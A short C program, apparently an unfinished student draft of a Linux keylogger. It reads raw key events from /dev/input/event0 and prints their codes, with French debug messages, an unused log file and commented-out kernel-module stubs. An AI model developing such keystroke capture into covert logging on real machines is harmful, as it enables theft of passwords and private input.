#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <sys/stat.h>
#include <linux/module.h>

//static int	__init keylogger_init(void)
int	main()
{
	struct input_event	ev;
	int			fd;
	FILE			*fp;
	char 			*map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'\\zxcvbnm,./";
	
	if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
		return 1;
	fp = fopen("keylogger", "a");
	while (1)
	{
		printf("avant le read\n");
		read(fd, &ev, sizeof(struct input_event));
		printf("apres le read\n");
		if ((ev.type == EV_KEY))
			printf("%d\n", ev.code);
		if (ev.value == 0)
			printf("la\n");
		printf("la\n");
	}
	return 0;
}
/*
static void	__exit keylogger_exit(void)
{
	printk(KERN_INFO "keylogger exit\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);*/
